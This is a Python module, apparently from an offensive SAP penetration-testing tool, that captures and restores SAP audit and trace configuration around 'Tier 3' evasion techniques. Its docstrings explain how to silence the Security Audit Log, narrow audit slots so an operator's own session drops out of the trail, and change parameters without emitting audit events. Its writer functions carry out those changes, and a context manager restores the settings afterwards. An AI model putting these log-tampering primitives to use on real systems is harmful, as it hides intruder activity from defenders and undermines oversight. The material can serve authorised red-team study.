"""Tier 3 baseline snapshot + restore-on-exit primitive.

Every Tier 3 action that mutates target state runs inside an
``evasion_window(node, state, technique)`` context manager:

    with evasion_window(node, state, "stad_silence") as w:
        change_param(node, creds, "stat/level", "0")   # mutate
        # ... operator work that depends on STAD being off ...
    # __exit__ restores stat/level to the captured baseline value
    # exactly once, no matter how the body exited.

The window is implemented in three layers:

1. ``capture_baseline(node, creds)`` reads the current SAL config +
   profile parameter values + filter-slot table contents.  Stores a
   ``BaselineSnapshot`` on the node *and* writes a JSON copy to
   ``loot/baseline/<sid>/<timestamp>.json`` so a crash-restart can still
   roll the system back.

2. ``evasion_window`` is the context-manager.  Auto-captures on entry
   if the node has no snapshot.  Records the technique invocation on a
   thread-local stack so re-entrant techniques work.  On exit
   (including exception path) it calls ``restore_baseline`` for every
   touched key.

3. ``restore_baseline(node, creds, snapshot, only=...)`` writes the
   captured values back via ``change_param`` which wraps the RFC-
   enabled kernel FM ``TH_CHANGE_PARAMETER``.  Dynamic, in-memory only
   — no profile file rewrite, no kernel restart, no AUM/AUW.

   Important: ``TH_CHANGE_PARAMETER`` only works for parameters the
   kernel marks **dynamic** (e.g. ``rdisp/TRACE``, ``icm/trace_level``).
   Static parameters (most of ``rsau/*``, ``stat/level``, ``rec/client``)
   either return a non-zero RC or silently no-op — the parameter
   value in shared memory may update, but the kernel keeps using the
   startup-cached value.  Per-technique writers for the static
   parameter families use purpose-built FMs (``RSAU_UPD_AUDIT_CONFIG``
   for SAL, table-row writes for DBTABLOG, etc.) and don't go through
   ``change_param``.

This file only defines the data carriers + capture / write / restore
primitives; each Tier 3 technique imports and wraps itself in the
window.
"""

from __future__ import annotations

import json
import logging
import os
import threading
from contextlib import contextmanager
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Iterator, Optional

logger = logging.getLogger(__name__)


# Parameters captured by the baseline.  Mirrors what Tier 1 already
# reads; extending the list means adding entries here AND wiring the
# corresponding set primitive in the restore path.
_BASELINE_PARAMS = (
    "rsau/enable",
    "rsau/selection_slots",
    "rsau/integrity",
    "rsau/ip_only",
    "rec/client",
    "stat/level",
    "gw/logging",
    "rdisp/TRACE",
)


@dataclass
class SalSlotInfo:
    """One row of ``ET_SLOT_INFO`` from ``RSAU_API_GET_AUDIT_CONFIG``.

    Mirror of structure ``RSAU_S_SLOT_INFO`` (26 components) as
    confirmed in the SAP Dictionary on S/4 HANA 793.  Stores Python-
    snake_case attribute names; the SAP boundary translation lives in
    ``from_rfc_row``.

    Field semantics relevant to Tier 3 evasion:
      * ``status='X'`` — slot is active and emitting events.
        Flipping all slots to ``' '`` is the basic "silence" primitive.
      * ``uname`` + ``mandt`` — slot scope.  Narrowing these excludes
        an operator's session from the audit trail.
      * ``severity_low/med/hgh`` — severity bitmap.  Clearing them
        makes the slot record nothing without changing scope.
      * ``class_*`` — event-class bitmap (login, transaction start,
        report start, RFC login/start, system events, user master).
      * ``msgvect`` — RAWSTRING per-message-ID mask.
    """

    profname: str = ""        # PROFNAME    CHAR(8)   audit profile name
    slotno: str = ""          # SLOTNO      NUMC(4)   slot number (e.g. "0001")
    status: str = ""          # STATUS      CHAR(1)   'X' = active
    selvar: str = ""          # SELVAR      RAW(1)    selection variant (hex)
    sel_user: str = ""        # SEL_USER    CHAR(1)
    sel_user_gen: str = ""    # SEL_USER_GEN CHAR(1)
    sel_ugrp_pos: str = ""    # SEL_UGRP_POS CHAR(1)
    sel_ugrp_neg: str = ""    # SEL_UGRP_NEG CHAR(1)
    db_filter: str = ""       # DB_FILTER   CHAR(1)
    mandt: str = ""           # MANDT       CLNT(3)
    uname: str = ""           # UNAME       CHAR(12)
    severity: int = 0         # SEVERITY    INT4
    severity_low: str = ""    # SEVERITY_LOW CHAR(1)
    severity_med: str = ""    # SEVERITY_MED CHAR(1)
    severity_hgh: str = ""    # SEVERITY_HGH CHAR(1)
    classes: int = 0          # CLASSES     INT4
    class_other: str = ""     # CLASS_OTHER     CHAR(1)
    class_login: str = ""     # CLASS_LOGIN     CHAR(1)
    class_tcd: str = ""       # CLASS_TCD       CHAR(1)
    class_rep: str = ""       # CLASS_REP       CHAR(1)
    class_rfc_login: str = "" # CLASS_RFC_LOGIN CHAR(1)
    class_user: str = ""      # CLASS_USER      CHAR(1)
    class_syst: str = ""      # CLASS_SYST      CHAR(1)
    class_rfc: str = ""       # CLASS_RFC       CHAR(1)
    msgvect: str = ""         # MSGVECT     RAWSTRING (hex)
    msg_list: str = ""        # MSG_LIST    STRING

    # Mapping from SAP field name → dataclass attribute.  Single source
    # of truth so to_dict / from_rfc_row stay aligned automatically.
    _SAP_TO_PY = {
        "PROFNAME": "profname", "SLOTNO": "slotno", "STATUS": "status",
        "SELVAR": "selvar",
        "SEL_USER": "sel_user", "SEL_USER_GEN": "sel_user_gen",
        "SEL_UGRP_POS": "sel_ugrp_pos", "SEL_UGRP_NEG": "sel_ugrp_neg",
        "DB_FILTER": "db_filter",
        "MANDT": "mandt", "UNAME": "uname",
        "SEVERITY": "severity",
        "SEVERITY_LOW": "severity_low", "SEVERITY_MED": "severity_med",
        "SEVERITY_HGH": "severity_hgh",
        "CLASSES": "classes",
        "CLASS_OTHER": "class_other", "CLASS_LOGIN": "class_login",
        "CLASS_TCD": "class_tcd", "CLASS_REP": "class_rep",
        "CLASS_RFC_LOGIN": "class_rfc_login", "CLASS_USER": "class_user",
        "CLASS_SYST": "class_syst", "CLASS_RFC": "class_rfc",
        "MSGVECT": "msgvect", "MSG_LIST": "msg_list",
    }
    _INT_FIELDS = ("severity", "classes")

    @classmethod
    def from_rfc_row(cls, row: dict) -> "SalSlotInfo":
        """Build from a single ``ET_SLOT_INFO`` row as returned by the
        NW RFC SDK.  Keys are SAP-style UPPERCASE; values come back as
        Python strings/ints/bytes depending on the ABAP type."""
        kwargs = {}
        for sap_key, py_key in cls._SAP_TO_PY.items():
            v = row.get(sap_key, "")
            if py_key in cls._INT_FIELDS:
                try:
                    kwargs[py_key] = int(v) if v not in (None, "", b"") else 0
                except (TypeError, ValueError):
                    kwargs[py_key] = 0
            elif isinstance(v, bytes):
                kwargs[py_key] = v.hex()
            else:
                kwargs[py_key] = (str(v) if v is not None else "").rstrip()
        return cls(**kwargs)

    def to_dict(self) -> dict:
        return {py: getattr(self, py)
                for py in self._SAP_TO_PY.values()}

    @classmethod
    def from_dict(cls, d: dict) -> "SalSlotInfo":
        kwargs = {}
        for py in cls._SAP_TO_PY.values():
            v = d.get(py, 0 if py in cls._INT_FIELDS else "")
            kwargs[py] = v
        return cls(**kwargs)


@dataclass
class SalConfig:
    """Full ``RSAU_API_GET_AUDIT_CONFIG`` response.

    Carries the global ED_* fields (master enable flag, version token,
    file-size cap, file pointer state) plus the list of populated
    filter slots.  Persisted into the baseline JSON so a Tier 3
    technique that mutates SAL state can be rolled back even after a
    crash-restart of SAPMAP itself.
    """

    version: int = 0          # ED_VERSION       — optimistic-concurrency token
    enable: str = ""          # ED_ENABLE        — 'X' / ' '
    slot_count: int = 0       # ED_SLOTCNT
    user_selection: int = 0   # ED_USER_SELECTION
    date: str = ""            # ED_DATE          — DD.MM.YYYY
    max_file_size: int = 0    # ED_MAXFILESIZE   — bytes/day cap
    size_of_file: int = 0     # ED_SIZEOFFILE
    cur_file_size: int = 0    # ED_CURFILESIZE
    cur_file_num: int = 0     # ED_CURFILENUM
    position: int = 0         # ED_POSITION
    file_status: int = 0      # ED_FILESTATUS
    slots: list = field(default_factory=list)   # [SalSlotInfo, ...]

    def to_dict(self) -> dict:
        return {
            "version": self.version,
            "enable": self.enable,
            "slot_count": self.slot_count,
            "user_selection": self.user_selection,
            "date": self.date,
            "max_file_size": self.max_file_size,
            "size_of_file": self.size_of_file,
            "cur_file_size": self.cur_file_size,
            "cur_file_num": self.cur_file_num,
            "position": self.position,
            "file_status": self.file_status,
            "slots": [s.to_dict() for s in self.slots],
        }

    @classmethod
    def from_dict(cls, d: dict) -> "SalConfig":
        return cls(
            version=int(d.get("version", 0) or 0),
            enable=str(d.get("enable", "") or ""),
            slot_count=int(d.get("slot_count", 0) or 0),
            user_selection=int(d.get("user_selection", 0) or 0),
            date=str(d.get("date", "") or ""),
            max_file_size=int(d.get("max_file_size", 0) or 0),
            size_of_file=int(d.get("size_of_file", 0) or 0),
            cur_file_size=int(d.get("cur_file_size", 0) or 0),
            cur_file_num=int(d.get("cur_file_num", 0) or 0),
            position=int(d.get("position", 0) or 0),
            file_status=int(d.get("file_status", 0) or 0),
            slots=[SalSlotInfo.from_dict(s)
                   for s in d.get("slots", []) or []],
        )


def _rows_to_jsonable(rows) -> list:
    """Hex-encode any bytes-typed RAWSTRING fields (MSGVECT, SELVAR)
    in a list of RFC response rows so the dict can survive json.dumps.
    The reverse conversion is handled by ``_rows_to_rfc``."""
    out = []
    for row in rows or []:
        r = {}
        for k, v in row.items():
            if isinstance(v, bytes):
                r[k] = v.hex()
            else:
                r[k] = v
        out.append(r)
    return out


def _rows_to_rfc(rows, byte_fields=("MSGVECT",)) -> list:
    """Reverse of ``_rows_to_jsonable`` — hex-decode the named byte
    fields back to ``bytes`` for the RAWSTRING parameter slots in
    ``RSAU_API_SET_PROFILE.IT_FILT*``.  Accepts both bytes and hex-
    string inputs so the helper is safe to call on fresh-from-RFC
    rows too."""
    out = []
    for row in rows or []:
        r = dict(row)
        for f in byte_fields:
            v = r.get(f)
            if isinstance(v, str):
                try:
                    r[f] = bytes.fromhex(v)
                except ValueError:
                    pass  # leave as-is; kernel rejection is informative
        out.append(r)
    return out


@dataclass
class BaselineSnapshot:
    """Captured state of a target node prior to Tier 3 mutation.

    Stored on the node in-memory and persisted under
    ``loot/baseline/<sid>/<timestamp>.json``.
    """

    sid: str = ""
    captured_at: str = ""
    params: dict = field(default_factory=dict)
    # Modern S/4 SAL config captured via RSAU_API_GET_AUDIT_CONFIG.
    # Primary source of truth for SAL filter restore.
    sal_config: Optional[SalConfig] = None
    # Legacy RSAUPROF rows — only populated on older NetWeaver kernels
    # where the modern API doesn't exist.  Kept for compatibility with
    # any tooling that still inspects it; new code should read
    # ``sal_config.slots`` instead.
    sal_filter_rows: list = field(default_factory=list)
    # Phase 3 — verbatim RSAU_API_GET_PROFILE response rows so the
    # window restore can re-write them via RSAU_API_SET_PROFILE
    # without any field re-shaping.  Stored as the kernel returned
    # them (bytes for RAWSTRING fields); to_dict / from_dict hex-
    # encode for JSON.
    dyn_filt: list = field(default_factory=list)
    dyn_filtex: list = field(default_factory=list)
    dyn_text: list = field(default_factory=list)
    # Free-form bag for technique-specific snapshot data
    # (e.g. NWA log-config XML before flip).  Keyed by technique id.
    technique_state: dict = field(default_factory=dict)
    loot_path: str = ""

    def to_dict(self) -> dict:
        return {
            "sid": self.sid,
            "captured_at": self.captured_at,
            "params": dict(self.params),
            "sal_config": (self.sal_config.to_dict()
                            if self.sal_config else None),
            "sal_filter_rows": list(self.sal_filter_rows),
            "dyn_filt": _rows_to_jsonable(self.dyn_filt),
            "dyn_filtex": _rows_to_jsonable(self.dyn_filtex),
            "dyn_text": _rows_to_jsonable(self.dyn_text),
            "technique_state": dict(self.technique_state),
            "loot_path": self.loot_path,
        }

    @classmethod
    def from_dict(cls, d: dict) -> "BaselineSnapshot":
        sal = d.get("sal_config")
        return cls(
            sid=d.get("sid", ""),
            captured_at=d.get("captured_at", ""),
            params=dict(d.get("params") or {}),
            sal_config=(SalConfig.from_dict(sal) if sal else None),
            sal_filter_rows=list(d.get("sal_filter_rows") or []),
            dyn_filt=list(d.get("dyn_filt") or []),
            dyn_filtex=list(d.get("dyn_filtex") or []),
            dyn_text=list(d.get("dyn_text") or []),
            technique_state=dict(d.get("technique_state") or {}),
            loot_path=d.get("loot_path", ""),
        )


# ---------------------------------------------------------------------------
# Capture
# ---------------------------------------------------------------------------

def _read_sal_config(conn) -> Optional[SalConfig]:
    """Call ``RSAU_API_GET_AUDIT_CONFIG`` and decode the response.

    Returns ``None`` when the FM doesn't exist on this kernel (older
    NetWeaver) so the caller can fall back to the legacy ``RSAUPROF``
    table read.  Any other RFC error is logged and treated as "no
    SAL config captured" — Tier 3 SAL techniques refuse to run when
    sal_config is None, but param-only techniques (rdisp/TRACE,
    icm/trace_level) are unaffected.
    """
    try:
        r = conn.call("RSAU_API_GET_AUDIT_CONFIG")
    except Exception as e:
        msg = str(e)
        if ("FUNCTION_NOT_FOUND" in msg or "FU_NOT_FOUND" in msg
                or "not implemented" in msg.lower()):
            return None
        logger.warning(f"RSAU_API_GET_AUDIT_CONFIG raised: {msg[:200]}")
        return None

    return SalConfig(
        version=int(r.get("ED_VERSION", 0) or 0),
        enable=str(r.get("ED_ENABLE", "") or "").strip(),
        slot_count=int(r.get("ED_SLOTCNT", 0) or 0),
        user_selection=int(r.get("ED_USER_SELECTION", 0) or 0),
        date=str(r.get("ED_DATE", "") or "").strip(),
        max_file_size=int(r.get("ED_MAXFILESIZE", 0) or 0),
        size_of_file=int(r.get("ED_SIZEOFFILE", 0) or 0),
        cur_file_size=int(r.get("ED_CURFILESIZE", 0) or 0),
        cur_file_num=int(r.get("ED_CURFILENUM", 0) or 0),
        position=int(r.get("ED_POSITION", 0) or 0),
        file_status=int(r.get("ED_FILESTATUS", 0) or 0),
        slots=[SalSlotInfo.from_rfc_row(row)
                for row in (r.get("ET_SLOT_INFO", []) or [])],
    )


def capture_baseline(node, creds=None,
                      loot_root: str = "loot") -> BaselineSnapshot:
    """Snapshot the audit/trace config on ``node`` for restore-on-exit.

    Reads:
      - Profile parameters via ``TH_GET_PARAMETER`` (same as Tier 1)
      - SAL config via ``RSAU_API_GET_AUDIT_CONFIG`` (modern S/4)
      - Legacy ``RSAUPROF`` rows only when the API didn't return a
        config (older NetWeaver kernels)

    Stores the snapshot in-memory on ``node._evasion_baseline`` and
    writes a JSON copy under ``loot/baseline/<sid>/<timestamp>.json``.

    Idempotent: re-invoking on a node that already has a snapshot
    returns the existing one (we never want to overwrite a baseline
    with post-mutation state).
    """
    existing = getattr(node, "_evasion_baseline", None)
    if existing is not None:
        return existing

    import sapmap_rfc
    from sapmap_errors import format_rfc_exception

    snap = BaselineSnapshot(
        sid=getattr(node, "sid", "?"),
        captured_at=datetime.now().isoformat(),
    )

    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            # Profile parameters via TH_GET_PARAMETER — same primitive
            # the Tier 1 probe uses, accepted on every modern kernel
            # and not subject to S_DEVELOP.
            for pname in _BASELINE_PARAMS:
                try:
                    r = conn.call("TH_GET_PARAMETER",
                                   PARAMETER_NAME=pname)
                    val = (r.get("PARAMETER_VALUE")
                           or r.get("VALUE")
                           or r.get("RETURN_VALUE") or "")
                    if isinstance(val, bytes):
                        val = val.decode("utf-8", errors="replace")
                    snap.params[pname] = val.strip() if isinstance(val, str) else val
                except Exception as e:
                    # Record the failure so the operator sees what
                    # couldn't be baselined.  Mark with a sentinel that
                    # restore() recognises and refuses to act on.
                    snap.params[pname] = f"__UNCAPTURED__:{format_rfc_exception(e)[:80]}"

            # SAL config — modern S/4 path via RSAU_API_GET_AUDIT_CONFIG.
            # Returns the full ED_* state + ET_SLOT_INFO rows.  We
            # decode into a typed SalConfig so downstream technique
            # writers can reason about specific slots / event-class
            # bits rather than re-parsing field positions.
            try:
                snap.sal_config = _read_sal_config(conn)
            except Exception as e:
                logger.warning(f"{snap.sid}: SAL config read raised: "
                                f"{format_rfc_exception(e)}")

            # Dynamic profile — verbatim ET_FILT / ET_FILTEX / ET_TEXT
            # via RSAU_API_GET_PROFILE(ID_DYN_CONF='X').  Cached so the
            # window restore can rewrite the same rows back via
            # RSAU_API_SET_PROFILE without any field re-shaping.
            try:
                dyn_resp = conn.call("RSAU_API_GET_PROFILE",
                                      ID_DYN_CONF="X")
                snap.dyn_filt = list(dyn_resp.get("ET_FILT") or [])
                snap.dyn_filtex = list(dyn_resp.get("ET_FILTEX") or [])
                snap.dyn_text = list(dyn_resp.get("ET_TEXT") or [])
            except Exception as e:
                logger.warning(f"{snap.sid}: RSAU_API_GET_PROFILE "
                                f"failed: {format_rfc_exception(e)}")

            # Legacy RSAUPROF fallback — only if the modern API wasn't
            # available (older NetWeaver kernels).  Modern S/4 returns
            # an empty result from RFC_READ_TABLE on RSAUPROF too, but
            # the API path already populated sal_config above so we
            # don't need this branch.
            if snap.sal_config is None:
                try:
                    r = conn.call(
                        "RFC_READ_TABLE",
                        QUERY_TABLE="RSAUPROF",
                        DELIMITER="|",
                        ROWCOUNT=200,
                    )
                    rows = r.get("DATA", []) or []
                    if rows:
                        snap.sal_filter_rows = [
                            (row.get("WA") or "") for row in rows]
                except Exception:
                    # RSAUPROF absent — leave both signals empty; the
                    # SAL-related Tier 3 techniques will refuse to run
                    # without a captured config.
                    pass
    except Exception as e:
        # Connect failed — don't return a half-baked snapshot.  The
        # gate check will refuse to run any Tier 3 technique because
        # node._evasion_baseline stays None.
        logger.warning(f"{snap.sid}: baseline capture failed at connect: "
                        f"{format_rfc_exception(e)}")
        return snap  # empty params; gate will refuse downstream

    # Persist to disk.  Stamp loot_path BEFORE serialising so the
    # JSON on disk records its own location — useful for forensic
    # provenance and for any tooling that consumes the file later.
    loot_dir = Path(loot_root) / "baseline" / snap.sid
    try:
        loot_dir.mkdir(parents=True, exist_ok=True)
        fname = f"baseline_{snap.captured_at.replace(':', '').replace('.', '_')}.json"
        path = loot_dir / fname
        snap.loot_path = str(path)
        path.write_text(json.dumps(snap.to_dict(), indent=2))
    except Exception as e:
        logger.warning(f"{snap.sid}: baseline loot write failed: {e}")

    node._evasion_baseline = snap
    return snap


# ---------------------------------------------------------------------------
# Writer — TH_CHANGE_PARAMETER
# ---------------------------------------------------------------------------

def change_param(node, creds, name: str, value: str) -> dict:
    """Dynamically write an SAP profile parameter via TH_CHANGE_PARAMETER.

    ``TH_CHANGE_PARAMETER`` is the RFC-enabled kernel FM that updates
    a parameter at runtime in shared memory.  No profile file is
    rewritten, no AUM/AUW SAL events are emitted, and the change
    survives until the instance restarts (or until restore_baseline
    rewrites it).  Parameter names are case-sensitive at the kernel
    boundary (same as TH_GET_PARAMETER on the read side).

    Returns a dict::

        {"ok": bool, "name": str, "value": str, "error": str}

    Raises nothing — even auth-denial / parameter-unknown failures
    are captured in the ``error`` field so the caller can decide
    whether to abort or continue.  The window context manager relies
    on this contract: a failed write is reported but doesn't stop
    restore from attempting the remaining params.
    """
    import sapmap_rfc
    from sapmap_errors import format_rfc_exception

    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            r = conn.call("TH_CHANGE_PARAMETER",
                           PARAMETER_NAME=name,
                           PARAMETER_VALUE=value)
            # TH_CHANGE_PARAMETER returns RC=0 on success.  Some
            # kernels also surface RETURN_CODE; treat any non-empty
            # non-zero rc as a failure.
            rc = r.get("RC", r.get("RETURN_CODE", "0"))
            rc_str = str(rc).strip()
            if rc_str not in ("", "0"):
                msg = (r.get("MESSAGE") or r.get("ERROR_MESSAGE")
                       or f"RC={rc_str}")
                return {"ok": False, "name": name, "value": value,
                        "error": str(msg)[:200]}
            return {"ok": True, "name": name, "value": value, "error": ""}
    except Exception as e:
        msg = format_rfc_exception(e).split("\n")[0][:200]
        return {"ok": False, "name": name, "value": value, "error": msg}


# ---------------------------------------------------------------------------
# Writer — RSAU_API_SET_PROFILE (dynamic in-memory profile only)
# ---------------------------------------------------------------------------

def _et_log_errors(rows) -> list:
    """Return BAPIRET2 rows with TYPE in (E, A, X) — kernel-side
    errors surfaced in-band rather than via RFC exceptions."""
    return [row for row in (rows or [])
            if (row.get("TYPE") or "").upper() in ("E", "A", "X")]


def write_dyn_profile(node, creds, et_filt, et_filtex=None,
                       et_text=None) -> dict:
    """Symmetric write counterpart to ``read_dyn_profile``.

    Calls ``RSAU_API_SET_PROFILE`` with ``ID_NAME='$DYN$'``,
    ``ID_UPD_DYN_CNF='X'`` and ``ID_SET_ACTIV=' '`` so the change
    lands in the in-memory dynamic config only — no profile file
    rewrite, no AUM/AUW, lost on instance restart.

    Accepts both fresh-from-RFC rows (with bytes-typed MSGVECT) and
    rows that came from a deserialised baseline JSON (hex-string
    MSGVECT).  Both shapes round-trip cleanly via ``_rows_to_rfc``.

    Returns ``{"ok": bool, "et_result": [...], "errors": [...],
    "error": str}``.  ``ok=False`` whenever ``ET_RESULT`` carries any
    TYPE E/A/X rows; the first kernel message lands in ``error``.
    Never raises — caller can decide whether to abort or continue.
    """
    import sapmap_rfc
    from sapmap_errors import format_rfc_exception

    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            r = conn.call(
                "RSAU_API_SET_PROFILE",
                ID_NAME="$DYN$",
                ID_UPD_DYN_CNF="X",
                ID_SET_ACTIV=" ",
                IT_FILT=_rows_to_rfc(et_filt),
                IT_FILTX=_rows_to_rfc(et_filtex),
                IT_FILT_TX=list(et_text or []),
            )
    except Exception as e:
        msg = format_rfc_exception(e).split("\n")[0][:200]
        return {"ok": False, "et_result": [], "errors": [],
                "error": f"RSAU_API_SET_PROFILE raised: {msg}"}

    et_result = r.get("ET_RESULT") or []
    errs = _et_log_errors(et_result)
    return {
        "ok": not errs,
        "et_result": et_result,
        "errors": errs,
        "error": (errs[0].get("MESSAGE", "") if errs else ""),
    }


# ---------------------------------------------------------------------------
# Restore
# ---------------------------------------------------------------------------

def restore_baseline(node, creds, snapshot: BaselineSnapshot,
                      only: Optional[list] = None,
                      restore_dyn_profile: bool = False) -> dict:
    """Write the captured parameter values back to the target.

    Args:
        only: optional list of parameter names to restore (default =
              every captured key).  Used by the context manager to
              only touch what the technique actually changed.

    Returns a dict::

        {
            "restored": [list of param names successfully restored],
            "skipped":  [(param, reason) for params we couldn't write],
            "snapshot_path": <loot json file>,
        }

    Each write uses ``change_param`` (TH_CHANGE_PARAMETER).  A failed
    write is recorded under ``skipped`` so the operator sees which
    params were left in their mutated state; the remaining keys are
    still attempted.
    """
    out = {"restored": [], "skipped": [],
            "snapshot_path": snapshot.loot_path}

    if snapshot is None or not snapshot.params:
        out["skipped"].append(("<all>", "no baseline params captured"))
        return out

    targets = (list(only) if only is not None
               else list(snapshot.params.keys()))
    for pname in targets:
        original = snapshot.params.get(pname, "")
        if isinstance(original, str) and original.startswith("__UNCAPTURED__"):
            out["skipped"].append((pname, "param was uncapturable"))
            continue
        # Real write — TH_CHANGE_PARAMETER, dynamic, no profile rewrite.
        r = change_param(node, creds, pname, str(original))
        if r["ok"]:
            print(f"[+] {snapshot.sid}: evasion-restore — "
                  f"{pname}={original!r}")
            out["restored"].append(pname)
        else:
            print(f"[!] {snapshot.sid}: evasion-restore FAILED "
                  f"{pname}={original!r} — {r['error']}")
            out["skipped"].append((pname, r["error"]))

    # Phase 3 — dyn profile restore.  When the technique signalled it
    # mutated the SAL filter table (via the touched_dyn_profile flag
    # on the evasion_window), we rewrite the baseline ET_FILT /
    # ET_FILTEX / ET_TEXT rows via RSAU_API_SET_PROFILE.
    if restore_dyn_profile and snapshot.dyn_filt:
        r = write_dyn_profile(node, creds, snapshot.dyn_filt,
                                snapshot.dyn_filtex,
                                snapshot.dyn_text)
        if r["ok"]:
            print(f"[+] {snapshot.sid}: dyn profile restored "
                  f"({len(snapshot.dyn_filt)} slot rows)")
            out["dyn_profile_restored"] = True
        else:
            print(f"[!] {snapshot.sid}: dyn profile restore FAILED — "
                  f"{r['error']}")
            out["dyn_profile_restored"] = False
            out["dyn_profile_error"] = r["error"]

    return out


# ---------------------------------------------------------------------------
# Context manager — auto-capture, auto-restore
# ---------------------------------------------------------------------------

# Per-thread stack of (node, technique, snapshot, touched_params).
# A nested ``with evasion_window(...)`` block reuses the outer-most
# snapshot so we never double-capture, and restore only fires for the
# outermost frame.
_local = threading.local()


def _stack() -> list:
    if not hasattr(_local, "stack"):
        _local.stack = []
    return _local.stack


@contextmanager
def evasion_window(node, state, technique: str,
                    creds=None,
                    touched_params: Optional[list] = None,
                    touched_dyn_profile: bool = False
                    ) -> Iterator[dict]:
    """Run a Tier 3 mutation under a captured baseline.

    Usage::

        from sapmap_evasion_gate import assert_evasion_allowed
        from sapmap_evasion_baseline import evasion_window

        assert_evasion_allowed(state, node, technique="stad_silence")
        with evasion_window(node, state, "stad_silence",
                             touched_params=["stat/level"]) as w:
            # ... mutate ...
        # baseline auto-restored on exit

    The yielded value is a dict so call-sites can stash technique-
    specific snapshot data (e.g. NWA log-config XML) under
    ``snapshot.technique_state[technique]`` for restore later.
    """
    from sapmap_evasion_gate import assert_evasion_allowed
    # Re-assert the gate inside the window — defensive: a caller might
    # forget the call site assert.  Skip baseline requirement because
    # we're about to capture one.
    assert_evasion_allowed(state, node, technique, require_baseline=False)

    snap = capture_baseline(node, creds)
    if not snap.params:
        # Capture failed — refuse to proceed; nothing to restore to.
        from sapmap_evasion_gate import EvasionGateError
        raise EvasionGateError(
            technique,
            "Baseline capture returned empty; refusing to mutate state "
            "without a restore path.")

    frame = {
        "node": node, "technique": technique,
        "snapshot": snap,
        "touched_params": list(touched_params or []),
        "touched_dyn_profile": bool(touched_dyn_profile),
        "started_at": datetime.now().isoformat(),
    }
    _stack().append(frame)
    is_outermost = len(_stack()) == 1

    try:
        yield frame
    finally:
        # Always pop, even on exception
        _stack().pop()
        if is_outermost:
            try:
                restore_baseline(
                    node, creds, snap,
                    only=frame["touched_params"] or None,
                    restore_dyn_profile=frame["touched_dyn_profile"])
            except Exception as e:
                logger.error(f"{snap.sid}: evasion-window restore "
                              f"failed for {technique}: {e}")
                print(f"[!] {snap.sid}: evasion-window restore "
                      f"FAILED for {technique}: {e}")


def active_window_count() -> int:
    """Returns the current depth of nested evasion windows on this
    thread.  Used by the GUI's status badge."""
    return len(_stack())
